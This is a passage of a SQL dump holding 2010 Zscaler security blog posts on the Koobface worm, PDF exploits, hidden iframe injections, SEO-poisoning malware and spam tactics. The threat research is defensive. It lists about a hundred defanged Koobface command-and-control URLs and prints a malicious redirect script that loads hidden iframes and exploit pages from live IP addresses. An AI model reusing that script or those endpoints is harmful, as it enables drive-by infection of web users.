103&crc=669\r\nhxxp://203.116.95.196/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://204.246.156.62/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://193.227.103.44/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://216.177.193.194/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://81.223.238.227/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://80.74.152.80/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.252.239.235/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://77.95.248.53/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.167.131.16/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://77.73.98.102/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://70.35.16.246/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://213.165.76.42/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://82.165.216.103/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://65.39.133.25/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://210.193.49.224/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://68.178.254.134/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://82.165.78.116/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://64.71.33.197/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://64.71.33.74/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://8.21.33.134/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.167.131.153/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.205.36.101/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://203.146.170.138/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://80.179.155.151/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://91.121.112.18/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://63.135.106.240/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.227.177.47/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.200.55.156/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://122.201.81.28/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.9.224.210/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://96.30.24.92/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://63.247.72.82/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://203.174.82.20/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://64.71.33.35/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://212.78.89.54/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.167.183.94/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://80.196.52.177/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://65.36.242.101/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://64.118.82.32/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://82.165.218.132/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.114.220.8/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://205.234.132.8/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.63.192.22/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://88.85.75.140/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://69.10.155.198/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.109.181.217/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://81.201.129.126/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://87.118.73.178/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://91.121.216.40/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://85.158.181.27/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.141.47.21/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://194.185.27.130/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://89.106.12.55/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://83.101.16.60/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://65.89.55.2/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://89.255.9.102/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.109.138.156/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.96.146.82/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://213.171.219.195/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://216.180.225.10/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.87.242.66/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://213.189.197.30/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.223.111.166/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://212.12.112.25/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://82.165.207.69/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.167.131.131/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.82.11.2/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://94.75.226.133/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://77.72.71.43/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://87.118.67.21/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://207.150.212.89/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://85.159.63.145/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.192.124.34/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://195.225.236.90/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://94.102.219.71/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://78.46.7.50/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.227.223.120/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://203.98.91.195/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://194.192.14.146/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://174.37.216.1/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.109.181.59/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.34.43.82/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.114.200.64/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.47.212.35/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.132.201.41/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://74.86.229.248/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.7.206.75/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://174.137.158.10/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://188.240.47.29/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://75.125.238.194/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://12.68.140.207/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.114.220.5/.sys/?action=ppgen&a=877186281&v=103&pid=1000\r\n \r\nThose unique IP’s are being used from different countries. And here is the top 10 among 122 unique IP’s.\r\n\r\n\r\nHere are some of the malicious binary file names used:\r\nv2captcha21.exe\r\nv2bloggerjs.exe\r\nfb.84.exe\r\nfbcheck.exe\r\ngo.exe\r\nv2prx.exe\r\nfb.82.exe\r\npp.14.exe\r\nv2webserver.exe\r\nhosts2.exe\r\nbe.20.exe\r\ntg.16.exe\r\nms.26.exe\r\n \r\nAttackers are creating new variants of the Koobface worm to infect the large number of users using social networking sites. They are not only using new domains for their C&C servers, but are also taking the advantage of social networking usage over weekends. We have seen increases in social networking usage and social networking attacks over the last years. The Koobface worm has shown that once a user is infected, their social networking account can be used to easily spread malware. Zscaler’s solution prevented many types of such attacks and this again shows the importance of multiple defense mechanisms like URL filtering/Categorization, IDS/IPS, Antivirus etc.\r\n\r\nKeep an eye on Koobface on weekends.\r\n\r\nUmesh', 'Malware', 'https://www.zscaler.com/blogs/research/koobface-worm-hits-weekend-increase-new-cc-servers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (545, 'Are URL Shorteners Really Dangerous?', 'Julien Sobrier', 'March 09, 2010', 'There has been plenty of buzz about URL shorteners and security. URL shorteners have been described as a new attack vector since being popularized by social networks such as Twitter. I don\'t feel that URL shorteners are any more of a threat than their full length counterparts and here\'s why...    How URL shorteners work      The purpose of a URL shortener is to replace a log URL (e.g: http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html) with a shorter one (e.g: http://bit.ly/cikl0z). When a user clicks on http://bit.ly/cikl0z, he is redirected to http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html via an HTTP 301 redirection:     GET /cikl0z HTTP/1.1  Host: bit.ly    HTTP/1.1 301 Moved  Location: http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html  ----------------------------------------------------------  GET /downloadwhitepaper_stateofweb-q4-2009.html HTTP/1.1  Host: www.zscaler.com    HTTP/1.1 200 OK  The browser made two requests: one to  http://bit.ly/cikl0 and one to http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html      Existing defense mechanisms    All the existing in-browser (Google Safe Browsing in Firefox, Opera\'s Fraud Protection, etc.) or external (IDS, proxy, etc.) URL scanners are applied on both the initial short and redirected long URL requests. If the long URL is a known malicious site, it will be stopped whether or not the the user clicks directly on the long URL, or on a shortened URL.         Firefox Safe Google Browsing warning on a URL after a redirection    Also, content inspection (Antivirus, Deep Packet inspection, etc.) is applied on both requests.    The use of URL shorteners and redirections does not require any new security inspection. All of the web browser security tools in place prior to the use of URL shorteners are still relevant.      Hiding the real URL    The main argument against URL shortening services is that users don\'t know which domain they are being redirected to. In our previous example, users see the bit.ly host name in the link address, and do not know that they will be redirected to www.zscaler.com until after they click on the link. After the redirection, the ultimate destination URL can be seen in the web browser address bar.           The long URL is displayed in the browser address bar after redirection    How many people know the difference between a good URL and a bad URL? Even then, how can anyone be sure that a site won\'t serve malicious content. Many perfectly legitimate websites (Redcross, Indian Governmental websites, etc.) have been hacked and can contain an infamous hidden iframe to spread malware. Well-known websites are no longer necessarily safer than unknown or new sites. Simply using the reputation of the hostname for deciding whether a URL is safe or not is not a good idea.      In a post Michael wrote a year ago, he checked 100,000 TinyURL (URL shortener service) urls. He did not find any link to a malicious executable, no phishing sites, and really few redirections to malicious content.    I believe the danger of URL shorteners has been overblown, mainly based on the idea that individuals are in a position to determine if a website is dangerous or not simply by looking at the final URL. Users are far better off relying on antivirus, URL blacklists and regular browser updates for security. And these tools work just fine or shortened URLs as well.         - Julien', 'Compromise', 'https://www.zscaler.com/blogs/research/are-url-shorteners-really-dangerous');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (546, 'In The Wild PDF Exploits Using A Combination Of “ASCIIHexDecode” And” ASCII85Decode” Filters', 'ThreatLabz', 'March 08, 2010', 'In the last few months, we have seen many blogs on PDF exploits related to filters like “ASCIIHexDecode”, “FlateDecode”, etc., being used to avoid Antivirus detection. The idea employed by attacker’s leverages different filtering techniques to hide malicious data so that it will be difficult to understand and decode. We have encountered many PDF exploits where either “[/FlateDecode /ASCIIHexDecode]” or “[/FlateDecode /ASCII85Decode]” filters are used. As defined by gnupdf, “the ASCIIHexDecode filter decodes data that has been encoded in ASCII hexadecimal form” and “the ASCII85Decode filter decodes data that has been encoded in ASCII base-85 encoding and produces binary data”. Interestingly, we have found another case, which Zscaler blocks, whereby both of the filters are used in the same PDF on different objects. This technique can be used to hide malicious code inside the PDF.\r\n\r\nThe following sample is still live on the web. Let’s open it in notepad and search for the “ASCIIHexDecode” or “ASCII85Decode” filters to see if they are used. Here is the screenshot where the “ASCIIHexDecode” filter is used:\r\n\r\nIf you look at the above image, there is something suspicious, a non-readable block of code in the 18 object with a length of 19343. The PDF is not blank and contains 4 pages text. The malicious code is injected toward the bottom of the PDF to avoid detection. Let’s decode it to see if it contains malicious JavaScript. The tool “pdf-parser.py” from PDF Tools supports both of the filters and easily decodes the code inside.\r\n\r\n The decoded script is now shown above. The above malicious script is using special characters like @, _, ?, !, $, etc for substitution in one of the variables. If we remove these characters from the variable, you will see clear text malicious JavaScript code inside. Looking at the above JavaScript code, it does not contain any functionality to replace or remove these characters. Without such functionality, the code would be incomplete. We therefore need to look for additional functionality elsewhere in the PDF file. We later found another filter called “ASCII85Decode”, which included some additional suspicious code. Here it is:\r\n\r\n Let’s decode this further using “pdf-parser.py” tool. The below command is used to decode this particular object.\r\nD:\\pdf-parser.py --object=20 --raw --filter withSearch.pdf > out2.log\r\nHere is the decoded script for this filter,\r\n\r\n That’s it. It does indeed contain additional malicious JavaScript. This is an interesting case where the script is divided into two parts, encoded using different filters and used in two different objects. This is done intentionally by the attacker to fool Antivirus engines and avoid detection. Let’s decode this script to see which PDF vulnerabilities it targets.\r\n\r\nThe above malicious JavaScript targets 3 old vulnerabilities,\r\n\r\n	collectEmailInfo() – CVE-2007-5659\r\n	Collab.getIcon() – CVE-2009-0927\r\n	.printf() – CVE-2008-2992\r\n\r\nThe above example showed that attackers are using different techniques to avoid Antivirus detection using different filtering mechanisms. Also, attackers are now splitting the scripts into parts, encoding them with different filtering techniques and putting them into different objects. Using this approach increases the complexity of decoding/detection. There are number of live PDF exploits on the web using these filtering techniques. Detection rates for the above example are very low. Only 13 antivirus vendors out of 42 detect this sample. The Virustotal results show that a number of popular Antivirus vendors are still missing the detection. This also shows that you can’t rely on a single protection mechanism like installing only an antivirus engine on your system. A combination of antivirus, IDS/IPS, URL filtering/categorization, etc is necessary in order to provide a defense-in-depth approach to security. We have seen an increase in client-side attacks like this as opposed to traditional server-side attacks. Attackers are not only targeting popular applications like PDF, Flash, etc., but they are also using a variety of techniques to deliver their malicious code as well.\r\n\r\nThat’s it for now. Be Safe.\r\n\r\nUmesh', 'Exploit', 'https://www.zscaler.com/blogs/research/wild-pdf-exploits-using-combination-asciihexdecode-and-ascii85decode-filters');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (547, 'Redcross Site Hacked', 'ThreatLabz', 'March 05, 2010', 'In this morning\'s logs I noticed that Zscaler detected malicious content within redcross-esc.org web-pages. Turns out that the site was a victim of a malicious iFrame injection, and I thought a short post on this would be a good follow-up from Umesh\'s previous post on hidden malicious iFrames.    redcross-esc.org belongs to the American Red Cross East Shoreline Chapter and is hosted on GoDaddy. Pages infected include:           	hxxp://www.redcross-esc.org/gethelp/index.html  	hxxp://www.redcross-esc.org/getinvolved/index.html  	hxxp://www.redcross-esc.org/givemoney/index.html      Screenshot of malicious iFrame:  First stage decode:  Final decode writes iFrame to hxxp://foxionserl.com/:    Fortunately the foxionserl.com domain is not currently resolving, so the malicious page is not being pulled - Google results show that it had hosted a Adobe Acrobat PDF Reader exploit. Notifications are being sent to Redcross and GoDaddy.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/redcross-site-hacked');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (548, 'Are You A Victim Of An Injected Malicious Hidden Iframe?', 'ThreatLabz', 'March 04, 2010', 'People surf to a number of web pages throughout the day - online shopping, banking, social networking, search engines, etc. But do they know when something bad is happening behind the web page visible in their browser? A large number of legitimate web sites have been victim of attacks, where the payload modifies the pages on the website to include hidden Iframes to malicious content. This content is processed by the browser, transparent to the user, and can compromise the user’s system if they are running vulnerable client applications (for example, the browser itself, browser plug-ins, Adobe Acrobat reader, and Flash player).    Malicious Iframe attacks are not new but remain heavily used to carry out different attacks. HTML Iframe tags are used to embed content into the web page from a particular source, including sources external from the actual web site. Attackers are using zero pixel Iframes embed malicious content while to keeping content hidden from the user. People are often become victims from such attacks as it is easy to inject such malicious Iframes into a legitimate webpage by taking advantage of web application vulnerabilities like SQL injection.    Let’s walk through live example where a malicious Iframe has been injected in the webpage. Here is the screenshot of one of the website injected by Iframe,                         The above screenshot shows obfuscated JavaScript is present in the webpage after the closing html “” tag (prior to the actual page body). Malzilla a user friendly GUI tool was used to decode the obfuscated JavaScript. You can find good documentation on their website.                       Interestingly, the JavaScript decodes into another obfuscated JavaScript. There is small function called dF() and a call to the “document.write()” function. Below is a screenshot of decoding this further:                              After decoding a second time, the JavaScript is clear and readable. This hidden injected Iframe embeds this JavaScript within the page, and when someone visits the page the JavaScript is processed by the browser, transparent to the user. If you look at the height and width of the Iframe, it is set to 1 pixel, which will not be seen by the user.         The above live example used multiple obfuscation techniques to hide the functionality of the malicious JavaScript. We have seen a number of websites infected with the same JavaScript code. The above example used “document.write()” function to write the malicious script into the page. Below is a decoded single obfuscated JavaScript example, which is still present on many websites:             Attackers are using simple to complex obfuscation techniques to encode their malicious script. Due to this, many Antivirus engines are unable to detect new injected Iframes. Here are the Virustotal results for the first example showing very low detection. Here is the third example of injected obfuscated script:                    There are some important points to be considered here.           	In the past, it was common for attackers to inject their malicious Iframes at the bottom / end of the webpage. Attackers are now injecting malicious Iframes anywhere in the webpage.  	Many websites which were found to be infected in past months by malicious hidden Iframes appear to still be infected with them. Meaning most web site owners or hosting providers are not policing the content that they are serving on the web.                Our data shows many previously infected websites are still infected with hidden malicious Iframes today. Due to different obfuscation techniques detection by Antivirus vendors remains poor. This shows that even if it is a well-known attack, people are still at risk of being compromised. Web site owners and hosting providers should regularly patch any 3rd party web applications used to avoid known vulnerabilities (such as SQL injection), and regularly inspect their web pages for unauthorized modification (to include these malicious Iframes). Look out for obfuscated JavaScript within webpage’s, and for additions made prior to or following the HTML body tags. Users should patch all client applications (browsers, browser plug-ins, Adobe Acrobat, Flash, Java, Microsoft Office, etc.) used to view content pulled from the web. Additionally users can inspect the source of webpage and report compromised sites to the web site owner or hosting provider.    Start acting now. Be Safe while surfing!    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/are-you-victim-injected-malicious-hidden-iframe');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (549, 'Chile Earthquake Tragedy Used To Spread Malware', 'Julien Sobrier', 'March 03, 2010', 'As we\'ve discussed multiple times, search engine optimization (SEO) is a favored tool for spreading malware. Along with the Haiti earthquake and the Winter olympics, the recent earthquake in Chile is a top news story. Unsurprisingly, attackers have already set up new websites to spread malware.    knoxhop.org/?q=hawai-tsunami-2010 is one of these malicious sites. It currently ranks from 19 to 22 for a Google search of \"Chile tsunami 2010\" (2nd or 3rd page). It shows up even with Safesearch on. As you can see on the screenshot, my antivirus thinks the page is safe (see the green star next to the page title added by the antivirus).        Google search result for \"Chile Tsunami 2010\"         The page is typical of the malware sites I have seen recently - the harmful data is sent only if you arrive from Google search results. That is, if your referrer header contains the Google search URL. Direct access to this page, or the wrong user agent, gives you a harmless (but ugly!) web page.        The harmless page with direct access         The malicious page is quite interesting:       <script>var ff=\"http://89.248.160.238/page.php?id=46\";var chr=\"http://89.248.160.238/page.php?id=46\";var op=\"http://217.23.5.216/hitin.php?land=20&affid=34100\";var otr=\"http://217.23.5.216/hitin.php?land=20&affid=34100\";document.write(\'<iframe src=\"http://mazefak.byethost8.com/1.html\" width=\"1\" height=\"1\"></iframe>\');if (navigator.appVersion.indexOf(\"Mac\")!=-1) window.location=\"http://www.zml.com/?did=5663\";else if (navigator.userAgent.indexOf(\"Firefox\")!=-1) document.write(\'<div style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #FFFFFF; padding: 0px\"><iframe src=\'+ff+\' width=\"100%\" height=\"100%\"></iframe></div>\');else if (navigator.userAgent.indexOf(\"Chrome\")!=-1) document.write(\'<div style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #FFFFFF; padding: 0px\"><iframe src=\'+chr+\' width=\"100%\" height=\"100%\"></iframe></div>\');else if (navigator.userAgent.indexOf(\"Opera\")!=-1) document.write(\'<div style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: #FFFFFF; padding: 0px\"><iframe src=\'+op+\' width=\"100%\" height=\"100%\"></iframe></div>\');else window.location=otr;</script>      Depending on the user agent, and the OS, the user gets different content. An iframe linking to a Russian website is added for all users. It is used to count the number of people hitting this page.    Mac users get redirected to http://www.zml.com/?did=5663. This is an affiliate link to the movie download site zml.com.    Chrome and Firefox users get an iframe to http://89.248.160.238/page.php?id=46 which contains obfuscated javascript. This URL is blocked by Firefox as a known malicious site.                            Firefox warning      Internet Explorer and Opera browsers get an iframe to a fakeAV page.    With every new big events come new malware pages. Be aware of unknown website, even if the are displayed as top results on Google, and shown as safe by your antivirus!     - Julien', 'Malware', 'https://www.zscaler.com/blogs/research/chile-earthquake-tragedy-used-spread-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (550, 'Fake Vancouver Winter Olympic Videos Spreading Malware', 'Michael Sutton', 'February 12, 2010', 'It certainly didn\'t take attackers long to take advantage of the Olympic Winter Games, which began today in Vancouver. Within minutes of the completion of the opening ceremonies, Twitter messages were appearing from an account called gamesvancouver. The shortened URL displayed promises footage of the opening ceremonies but instead redirects users to a page that is effectively a mirror image of the official web page for the 2010 Vancouver Olympics. Upon closer inspection, however, it can be seen that the domain name used by the site is a slight misspelling of the official site, replacing a \'u\' for an \'n\' in the vancouver2010.com domain name.       The attackers are using a common technique of social engineering victims into downloading a fake codec for Flash, which the site states is necessary in order to view the requested video. In reality, the victim is downloading and installing a Windows executable which contains a Trojan/Downloader. The malicious file is currently detected by only 11 of 41 anti-virus vendors (VirusTotal results). Given the popularity of the Winter Olympics, it is not surprising that attackers are taking advantage of the event to spread malware. It is however concerning that most anti-virus vendors are unable to address this particular threat. Given the authentic nature of the attack site, lack of anti-virus signatures, use of Twitter to advertise the campaign and timing of the attack, it is reasonable to assume that it will succeed in achieving its goal of infecting numerous machines.         Enjoy the Olympics, but be careful where you click!         - michael', 'Scam', 'https://www.zscaler.com/blogs/research/fake-vancouver-winter-olympic-videos-spreading-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (551, 'Google Buzz For Spammers', 'ThreatLabz', 'February 11, 2010', 'The Google Buzz sign-up is being advertised to users when logging into Gmail, and is a fairly transparent process to users with an existing Gmail account.         Clicking on “Sweet! Check out Buzz” brings you to your initial follower/follow back network of friends:          And as the privacy statement suggested, it automatically determined people who have communicated with me over Gmail and that joined Buzz to follow me. Similarly Buzz made suggestions on whom I should follow. From the Buzz privacy statement:          For me, the default web apps connected to Buzz were my public facing Picasa and Google Reader:        By default, (as stated in the Google Privacy statement) the list of people that I am following and the people following me will be publicly displayed on my profile.             As numerous folks have blogged about (e.g., CNET), this could be a privacy concern for users who do not want to share their social network with the world. As with other social networks, this could be used to gather intelligence on individuals, the corporations/organizations/groups they belong to, and could be used in targeted spear phishing or impersonation attacks. To the general user on the web however, many of the benefits of social networking out-weigh the risks.    In addition to these concerns, there are also a few other items that Google Buzz brings to the table for an attacker. One item in particular is email validation. I clicked on one of my co-worker\'s that was following me from his default setup for his Buzz profile … I was able to then see the people that he is following and those following him (again, default setting). The people in his social network that I had emailed in the past from my Gmail account have their email address exposed, those that I had not emailed in the past did not have this exposed.        A user with a Buzz account, means that they have a Gmail account, and the name visible in Buzz is often used in some form or another as the user\'s Gmail account. As a spammer, one could create a network of Gmail accounts connected to Buzz and follow a large number of users, follow their followers, etc. Harvest user names / alias names for those being followed, and do best guess attempts at guessing their email address and start sending test messages. Once a successful guess has occurred, the email address will then be exposed in the Buzz interface validating that the email address exists and is tied to that user.         The way this would likely work and scale for the spammer is through the creation of an automated Google Buzz bot or worm to build a list of followers and spider out to the followers of followers and so forth in order to harvest Gmail names / aliases to guess against and build an email spam list. The email validation not only validates that the email account is live, but validates that it is linked to the social network visible in Buzz. In other words, knowledge of that particular user\'s social network could also be used in an automated but more targeted spam campaign. For example, email subject \"Hey I see you are friends with XYZ...\" email body: \"Here are some pictures of her that I thought you would get a kick out of: insert malicious link/attachment\" (remind you of Koobface?).         Additionally, once a user is connected / followed in Buzz you can interact in other mediums besides email. This could be leveraged to bypass spam filters within Gmail. Gchat, Google Wave, Blogger, Google Reader, etc. are some examples of interactive mediums that Buzz provides its users.', 'Abuse', 'https://www.zscaler.com/blogs/research/google-buzz-spammers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (552, 'Indian Gov\'t Site Victim Of Ad Campaign', 'ThreatLabz', 'February 05, 2010', 'I noticed an Inidan Gov\'t site in Zscaler\'s blocked logs from yesterday:    hxxp://www.hil.gov.in      Hindustan Insecticides Limited: A Government of India Enterprise  (I\'m sure you can appreciate the irony here, as insecticides are used to kill bugs).    Viewing the source of the page, there is an embedded iframe in the beginning to:  hxxp://193.104.27.99/ad.php      which redirects to: hxxp://cfkrdbfplrla.com/ld/tuta4/and is used to advertise A/V, registry cleaner, etc. wares through:    hxxp://www.searchmagnified.com/Free_Antivirus.cfm?domain=cfkrdbfplrla.com&foiffs=in100fweg&cifr=1&fp= ~snip~    McAfee SiteAdvisor and other Google results for SearchMagnified lists it as being involved in some suspicious activities.    I was expecting to follow the link and reach an obvious Fake A/V page. Instead I reached:    hxxp://www.cyberdefender.com/EDC/landing/10/?affl=tsayahooedc_antixvirusxfree&campaign_code=002048&int_page=1& ~snip~    Note the affiliate ID and the campaign code in the link parameters. The SearchMagnified links are pay-per-click links, so they are making a buck off the Indian Gov\'t redirect when folks follow the links. The links in this case pointed me to CyberDefender, a legit A/V vendor who are paying affiliates to advertise on the web for them - the problem is that the affiliates may engage in less than legit practices (as is the case here).', 'Compromise', 'https://www.zscaler.com/blogs/research/indian-govt-site-victim-ad-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (553, 'The Death Of IE 6 Is Greatly Exaggerated', 'Michael Sutton', 'February 04, 2010', 'Champagne bottles were popping this week as victory was declared in the war on IE6. I say not so fast. The effort to rid the world of IE6 has been going on for some time but a couple of recent high profile events have brought this issue to the masses. The first was Operation Aurora, the Advanced Persistent Threats that allegedly came out of China and infiltrated Google, Adobe and 30+ other large corporations. While the vulnerability used to install the Hydraq Trojan at the core of the attack affected all supported versions of IE, the exploit leveraged, only worked against IE6. Why? Because IE6 lacks advanced security protections found in IE 7 & 8. The second story making the rounds this week is that Google has taken a stand and starting next month will phase out support for IE 6, starting with Google Docs and Google Sites. I applaud this move. Only when end users can\'t access their favorite sites will we finally see an across the board upgrade that should have happened years ago.         Enterprises argue that there is no urgency to upgrade beyond IE 6 as it is still a supported browser. I argue that as a CISO, you\'re flat out negligent if you haven\'t fought to get IE 6 off of your network. Just because a product is still supported doesn\'t make it secure. Yes, Microsoft will release security patches when IE 6 breaks, but IE 6 lacks numerous security features found in IE 7&8. Features like DEP, ASLR, malicious URL/phishing block lists and XSS/Clickjacking protections. This is why IE 6 is targeted by attackers, because it is the low hanging fruit in the browser world.           One thing is bothering me though. I keep hearing how IE8 is making great strides and that IE6 is finally dying off. I read numerous articles this week covering the NetApplications January 2010 report, which revealed how IE8 has now overtaken IE6 in terms of market share. Whenever I see such data I ask myself what the sample population is. Generally, such data is collected from server logs. As such, it represents a broad spectrum of end users, including both corporate and personal web traffic. I have long believed that individuals are more likely to upgrade web browsers than corporations. Afterall, we all want the latest features and software upgrades are just a click away. Corporations on the other hand don\'t generally allow users to decide what software runs on their desktop and from a security perspective, they shouldn\'t. They also tend to focus on concerns over breaking functionality, often to the detriment of security. What I\'m interested in is seeing the percentage of browser market share for only corporate users. This is something that Zscaler is in a strong position to answer. We sell an enterprise offering, so our clients tend to be corporations or government entities. Being a SaaS offering, any web capable device can utilize the Zscaler cloud and certainly some enterprises have traffic from user owned/controlled devices (personal laptops and smartphones) running through the cloud as well, but it\'s fair to say that overall, our view of the world is primarily enterprise traffic as opposed to personal traffic. I therefore ran a query to determine the results of web browser usage on our network for all of Q4 2009. As you can see, our results are very different than the results from NetApplications. From October to December 2009, 72.21% of the traffic that we saw came from IE browsers. The pie chart breaks this traffic down to reveal the individual versions of IE encountered. Not only is IE6 still in the lead but IE8 is barely on the map, a finding vastly different from the NetApplications stats which show IE8 in the lead. My conclusion? Enterprises are not moving away from IE6 as quickly as the web population as a whole.         Let\'s hope that recent events such as Operation Aurora and Google\'s stand to drop IE6 support cause enterprises to better understand the urgency of this issue. Let\'s further hope that Microsoft puts IE6 out to pasture once and for all.         - michael', 'Microsoft', 'https://www.zscaler.com/blogs/research/death-ie-6-greatly-exaggerated');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (554, 'Blackhat SEO Is New Spam', 'ThreatLabz', 'January 28, 2010', 'It used to be that when you checked your email and/or email spam folder there would be a slew of messages with links or attachments that would have titles related to the popular subjects of the time, and would be used to spread malware (think Anna Kournikova).    Now the game seems to be that you sip your morning coffee and browse the web - largely driven from search results from Google. However, many of these search results cannot be trusted - Google\'s web of trust, Page Rank technology has been leveraged by the bad guys using search engine optimization (SEO) to spread malware. This has been seen in almost every major news story this year (for example, Haiti\'s Earthquake) and some not so major news stories (American Idol\'s \'pants on the ground\' audition).    The past few days, there have been numerous big headline stories with poisoned Google search results leading the victim to Fake Anti-Virus malware: Apple\'s iPad announcement, Toyota\'s safety recall, and the State of the Union address all have poisoned search results ... just wait \"Super Bowl\" the bad guys will get to you next if they haven\'t already ...    Below are some screenshots of the poisoned results, followed by the subsequent infection. Note, visiting the SEOed links directly redirects you to a benign page, such as cnn.com; visiting with a Google referrer string (which someone following the link from Google would have) takes the user to the malicious page.', 'Abuse', 'https://www.zscaler.com/blogs/research/blackhat-seo-new-spam');
